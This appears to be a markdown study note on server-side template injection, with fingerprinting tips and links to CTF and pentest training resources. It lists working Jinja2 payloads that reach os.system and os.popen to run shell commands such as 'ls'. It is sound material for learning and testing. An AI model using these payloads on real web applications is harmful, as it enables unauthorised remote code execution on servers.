# Server-Side Template Injection (SSTI)

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![jinja2_ssti](../../../../_badges/hacktricks/jinja2_ssti.svg)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)
[![python_ssti_introduction](../../../../_badges/rootme/web_server/python_ssti_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Server/Python-Server-side-Template-Injection-Introduction)
[![java_ssti](../../../../_badges/rootme/web_server/java_ssti.svg)](https://www.root-me.org/en/Challenges/Web-Server/Java-Server-side-Template-Injection)

<div class="row row-cols-lg-2"><div>

Server-Side Template Injection occurs when we can inject code that is parsed by a template engine such as [Jinja2](/programming-languages/web/topics/templating/jinja2/index.md) in Python.

You may be able to guess the template engine used from the web server, for instance, if it's Python then it's most likely Jinja.

To guess the template engine, we can try every token (`${{<%[%'"}}%\`) with expressions such as `7*7` or `7*'7'` and look for the output/errors.

* [Port Swigger SSTI Decision Tree](https://portswigger.net/web-security/images/template-decision-tree.png)
* [Template Injection Table](https://cheatsheet.hackmanit.de/template-injection-table/)
</div><div>
</div></div>

<hr class="sep-both">

## Well-Known Template Engines

<div class="row row-cols-lg-2"><div>

#### Jinja2 Template Engine ‚Äî Python

Refer to [JinJa2 Notes](/programming-languages/web/topics/templating/jinja2/index.md) if needed.

* Basic Fingerprint PoC: `{{ "PoC"|e }}`
* Test if debug is enabled: `{% debug %}`
* Try to print the context `{{ self._TemplateReference__context }}`
* Then, you might be able to perform code injection:

```js!
{{ cycler.__init__.__globals__.os.system('ls') }}
{{ cycler.__init__.__globals__.os.popen("ls -1a").read() }}
{{ lipsum.__globals__.os.popen('ls -1a').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').system('ls') }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('ls -1a').read() }}
```

‚ö†Ô∏è Before, we were using longer payloads as [explained here](https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/).
</div><div>
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* `{{ self.__init__.__globals__.__builtins__.__import__('os') }}`
</div><div>
</div></div>